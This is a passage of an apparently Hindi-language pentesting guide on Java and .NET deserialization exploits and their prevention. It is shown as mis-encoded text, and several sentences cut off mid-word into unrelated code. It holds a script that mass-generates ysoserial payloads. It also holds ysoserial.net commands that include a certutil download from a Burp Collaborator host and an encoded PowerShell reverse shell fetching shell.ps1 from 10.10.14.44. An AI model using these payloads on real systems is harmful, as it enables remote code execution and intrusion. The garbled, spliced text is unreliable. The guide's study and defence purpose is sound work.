рд▓рд┐рдП рдЖрдк [рдЗрд╕ рд╡реЗрдмрдкреЗрдЬ](http://www.jackson-t.ca/runtime-exec-payloads.html) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╡рд┐рдиреНрдбреЛрдЬ рдФрд░ рд▓рд┐рдирдХреНрд╕ рдХреЗ рд▓рд┐рдП **рд╕рднреА рд╕рдВрднрд╛рд╡рд┐рдд рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди** payloads рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдЧрд▓реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдлрд┐рд░ рдЙрдиреНрд╣реЗрдВ рд╕рдВрдХреНрд░рдорд┐рдд рд╡реЗрдм рдкреЗрдЬ рдкрд░ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### рд╕реАрд░рд┐рдпрд▓рдХрд┐рд▓рд░рдмрд╛рдпрдкрд╛рд╕рдЧреИрдЬреЗрдЯреНрд╕

рдЖрдк **рдЗрд╕реНрддреЗрдорд╛рд▓** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **ysoserial рдХреЗ рд╕рд╛рде рдЕрдзрд┐рдХ рдЙрддреНрдкреАрдбрд╝рди рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП**ред рдЗрд╕ рдЯреВрд▓ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА **рдЯреЙрдХ рдХреЗ рд╕реНрд▓рд╛рдЗрдбреНрд╕** рдореЗрдВ рд╣реИ рдЬрд╣рд╛рдБ рдЯреВрд▓ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### рдорд╛рд░реНрд╢рд▓рд╕реЗрдХ

[**marshalsec** ](https://github.com/mbechler/marshalsec)рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рд╡рд┐рднрд┐рдиреНрди **Json** рдФрд░ **Yml** рд╕рд┐рд░реАрдХрд░рдг рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рдЙрддреНрдкреАрдбрд╝рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред\
рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЛ рдХреЙрдореНрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдореБрдЭреЗ `pom.xml` рдореЗрдВ рдЗрд╕ **рдбрд┐рдкреЗрдВрдбреЗрдВрд╕реА** рдХреЛ **рдЬреЛрдбрд╝рдиреЗ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**рдореЗрд╡реЗрди рдЗрдВрд╕реНрдЯреЙрд▓** рдХрд░реЗрдВ, рдФрд░ **рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЛ рдХрдВрдкрд╛рдЗрд▓** рдХрд░реЗрдВ:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

рдЗрд╕ Java JSON рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкрдврд╝реЗрдВ: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* рдпрджрд┐ рдЖрдк рдХреБрдЫ ysoserial payloads рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдк **рдЗрд╕ рд╡реЗрдм рдРрдк** рдХреЛ **рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Why

Java рд╡рд┐рднрд┐рдиреНрди рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдзрд╛рд░рдгреАрдХрд░рдг рдХрд╛ рдмрд╣реБрдд рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреИрд╕реЗ:

- **HTTP рдЕрдиреБрд░реЛрдз**: рдзрд╛рд░рдгреАрдХрд░рдг рдкреИрд░рд╛рдореАрдЯрд░, ViewState, рдХреБрдХреА рдЖрджрд┐ рдХреЗ рдкреНрд░рдмрдВрдзрди рдореЗрдВ рд╡реНрдпрд╛рдкрдХ рд░реВрдк рд╕реЗ рдкреНрд░рдпреБрдХреНрдд рд╣реЛрддрд╛ рд╣реИред
- **RMI (Remote Method Invocation)**: Java RMI рдкреНрд░реЛрдЯреЛрдХреЙрд▓, рдЬреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдзрд╛рд░рдгреАрдХрд░рдг рдкрд░ рдирд┐рд░реНрднрд░ рд╣реИ, рдЬрд╛рд╡рд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рджреВрд░рд╕реНрде рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдПрдХ рдореВрд▓рдЧреНрд░рдВрде рд╣реИред
- **RMI рдУрд╡рд░ HTTP**: рдпрд╣ рд╡рд┐рдзрд┐ рдЬрд╛рд╡рд╛ рдЖрдзрд╛рд░рд┐рдд рдореЛрдЯреЗ рдХреНрд▓рд╛рдЗрдВрдЯ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рджреНрд╡рд╛рд░рд╛ рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдкреНрд░рдпреБрдХреНрдд рдХреА рдЬрд╛рддреА рд╣реИ, рдЬреЛ рд╕рднреА рдСрдмреНрдЬреЗрдХреНрдЯ рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдзрд╛рд░рдгреАрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИред
- **JMX (Java Management Extensions)**: JMX рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдзрд╛рд░рдгреАрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
- **рдХрд╕реНрдЯрдо рдкреНрд░реЛрдЯреЛрдХреЙрд▓**: рдЬрд╛рд╡рд╛ рдореЗрдВ рдорд╛рдирдХ рдЕрднреНрдпрд╛рд╕ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХрдЪреНрдЪреЗ рдЬрд╛рд╡рд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рдкреНрд░реЗрд╖рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдЖрдЧрд╛рдореА рд╢реЛрд╖рдг рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

### Prevention

#### рдЕрд╕реНрдерд╛рдпреА рдСрдмреНрдЬ
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### рдПрдХ рдХрдХреНрд╖рд╛ рдХреА рд╕рд┐рд░рд▓реЗрдмрд▓рд┐рдЬреЗрд╢рди рд╕реЗ рдмрдЪреЗрдВ рдЬреЛ `Serializable` рдЗрдВрдЯрд░рдлреЗрд╕ рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ

рдРрд╕реЗ рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдБ рдХреБрдЫ **рдСрдмреНрдЬ
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **рдЬрд╛рд╡рд╛ рдореЗрдВ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрдврд╝рд╛рдирд╛**

**`java.io.ObjectInputStream` рдХреЛ рдХрд╕реНрдЯрдорд╛рдЗрдЬрд╝ рдХрд░рдирд╛** рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡реНрдпрд╛рд╡рд╣рд╛рд░рд┐рдХ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╣реИред рдпрд╣ рд╡рд┐рдзрд┐ рдЙрдкрдпреБрдХреНрдд рд╣реИ рдЬрдм:

- рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЛрдб рдЖрдкрдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рд╣реИред
- рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЗ рд▓рд┐рдП рдЕрдкреЗрдХреНрд╖рд┐рдд рдХрдХреНрд╖рд╛рдПрдБ рдЬреНрдЮрд╛рдд рд╣реИрдВред

**`resolveClass()`** рдореЗрдердб рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░реЗрдВ рддрд╛рдХрд┐ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЛ рдХреЗрд╡рд▓ рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдХрдХреНрд╖рд╛рдУрдВ рддрдХ рд╣реА рд╕реАрдорд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЗрд╕рд╕реЗ `Bicycle` рдХрдХреНрд╖рд╛ рддрдХ рд╣реА рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреА рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**рд╕реБрд░рдХреНрд╖рд╛ рдореЗрдВ рд╕реБрдзрд╛рд░ рдХреЗ рд▓рд┐рдП рдЬрд╛рд╡рд╛ рдПрдЬреЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдПрдХ рд╡рд┐рдХрд▓реНрдк рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрдм рдХреЛрдб рд╕рдВрд╢реЛрдзрди рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реЛрддрд╛ред рдпрд╣ рд╡рд┐рдзрд┐ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ **рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдХрдХреНрд╖рд╛рдУрдВ рдХреЛ рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рд╣реЛрддреА рд╣реИ, рдЬреЗрд╡реАрдПрдо рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```
-javaagent:name-of-agent.jar
```
рдпрд╣ рдПрдХ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЛ рдирд┐рд░рдВрддрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╣реИ, рдЬреЛ рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЖрдж immediate рдХреЛрдб рдкрд░рд┐рд╡рд░реНрддрди рдЕрд╕рдВрднрд╡ рд╣реИред

[rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0) рдореЗрдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗрдВред


**рд╕рд┐рд░реАрдХрд░рдг рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕ рдХрд╛ рд▓рд╛рдЧреВ рдХрд░рдирд╛**: рдЬрд╛рд╡рд╛ 9 рдиреЗ **`ObjectInputFilter`** рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рд┐рд░реАрдХрд░рдг рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕ рдХрд╛ рдкрд░рд┐рдЪрдп рдХрд┐рдпрд╛, рдЬреЛ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЬрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╕рд┐рд░реАрдХрд░рдг рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдСрдмреНрдЬ
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**рдмреЗрд╣рддрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП рдмрд╛рд╣реНрдп рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛**: **NotSoSerial**, **jdeserialize**, рдФрд░ **Kryo** рдЬреИрд╕реА рдкреБрд╕реНрддрдХрд╛рд▓рдп рдЬрд╛рд╡рд╛ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдФрд░ рдореЙрдирд┐рдЯрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдиреНрдирдд рд╕реБрд╡рд┐рдзрд╛рдПрдВ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИрдВред рдпреЗ рдкреБрд╕реНрддрдХрд╛рд▓рдп рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯрд┐рдВрдЧ рдпрд╛ рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯрд┐рдВрдЧ рдХреНрд▓рд╛рд╕реЗрд╕, рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╕реЗ рдкрд╣рд▓реЗ рд╕рд┐рд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдиреЗ, рдФрд░ рдХрд╕реНрдЯрдо рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд░рдгрдиреАрддрд┐рдпреЛрдВ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдЬреИрд╕реА рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреА рд╣реИрдВред

- **NotSoSerial** рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреЛрдб рдХрд╛ рдирд┐рд╖реЗрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд░реЛрдХрддрд╛ рд╣реИред
- **jdeserialize** рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЬрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╕рд┐рд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдЬрд╛рд╡рд╛ рдСрдмреНрдЬ
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** рдореЗрдВ рдПрдХ **рдмрд╣реБрдд рджрд┐рд▓рдЪрд╕реНрдк рдкреИрд░рд╛рдореАрдЯрд░** рднреА рд╣реИ рдЬреЛ рд╣рд░ рдПрдХ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛рдо рдХреИрд╕реЗ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕реЗ рдмреЗрд╣рддрд░ рд╕рдордЭрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИ: `--test`\
рдпрджрд┐ рдЖрдк рдЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рддреЛ **ysoserial.net** **рд▓реЛрдХрд▓реА рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛,** рддрд╛рдХрд┐ рдЖрдк рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХреЗрдВ рдХрд┐ рдЖрдкрдХрд╛ рдкреЗрд▓реЛрдб рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдХрд░реЗрдЧрд╛ред\
рдпрд╣ рдкреИрд░рд╛рдореАрдЯрд░ рдорджрджрдЧрд╛рд░ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрджрд┐ рдЖрдк рдХреЛрдб рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░рд╣ рдХреЗ рдХреЛрдб рдЯреБрдХрдбрд╝реЗ рдкрд╛рдПрдВрдЧреЗ ([ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдб [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) рдХреЛ рдХреЙрд▓ рдХрд░реЗрдЧрд╛ред
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
**рдкрд┐рдЫрд▓реЗ рдХреЛрдб рдореЗрдВ рдЙрддреНрдкрдиреНрди рджреБрд░реБрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдпреЛрдЧреНрдп рд╣реИред** рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдк .Net рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдХреБрдЫ рд╕рдорд╛рди рдвреВрдВрдврддреЗ рд╣реИрдВ рддреЛ рдпрд╣ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рд╡рд╣ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рднреА рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рднреЗрджреНрдп рд╣реИред

рдЗрд╕рд▓рд┐рдП **`--test`** рдкреИрд░рд╛рдореАрдЯрд░ рд╣рдореЗрдВ рд╕рдордЭрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИ рдХрд┐ **рдХреМрди рд╕реЗ рдХреЛрдб рдЦрдВрдб рд╡рдВрд╢реАрдХрд░рдг рджреБрд░реБрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рднреЗрджреНрдп рд╣реИрдВ** рдЬрд┐рдиреНрд╣реЗрдВ **ysoserial.net** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред

### ViewState

[**рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЛ рджреЗрдЦреЗрдВ рдЬрд┐рд╕рдореЗрдВ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ .Net рдХреЗ \_\_ViewState рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**](exploiting-\_\_viewstate-parameter.md)**ред** рдпрджрд┐ рдЖрдк **рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдкреАрдбрд╝рд┐рдд рдорд╢реАрди рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдЬрд╛рдирддреЗ рд╣реИрдВ, [**рддреЛ рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЛ рдкрдврд╝реЗрдВ рдЬрд┐рд╕рдореЗрдВ рдХреЛрдб рдХреИрд╕реЗ рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**](exploiting-\_\_viewstate-knowing-the-secret.md)**ред**

### рд░реЛрдХрдерд╛рдо

.Net рдореЗрдВ рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗ рдЬреЛрдЦрд┐рдореЛрдВ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

- **рдбреЗрдЯрд╛ рд╕реНрдЯреНрд░реАрдо рдХреЛ рдЙрдирдХреЗ рдСрдмреНрдЬреЗрдХреНрдЯ рдкреНрд░рдХрд╛рд░ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рд╕реЗ рдмрдЪреЗрдВред** рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрдиреЗ рдкрд░ `DataContractSerializer` рдпрд╛ `XmlSerializer` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

- **`JSON.Net` рдХреЗ рд▓рд┐рдП, `TypeNameHandling` рдХреЛ `None` рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВ:**
%%%TypeNameHandling = TypeNameHandling.None%%%

- **`JavaScriptSerializer` рдХрд╛ рдЙрдкрдпреЛрдЧ `JavaScriptTypeResolver` рдХреЗ рд╕рд╛рде рди рдХрд░реЗрдВред**

- **рд╡рдВрд╢реАрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреА рд╕реАрдорд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░реЗрдВ**, .Net рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рд╕рдВрдЧрд╣рд┐рдд рдЬреЛрдЦрд┐рдореЛрдВ рдХреЛ рд╕рдордЭреЗрдВ, рдЬреИрд╕реЗ `System.IO.FileInfo`, рдЬреЛ рд╕рд░реНрд╡рд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдЧреБрдгрд╡рддреНрддрд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдирдХрд╛рд░рд╛рддреНрдордХ рд╕реЗрд╡рд╛ рд╣рдорд▓реЛрдВ рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

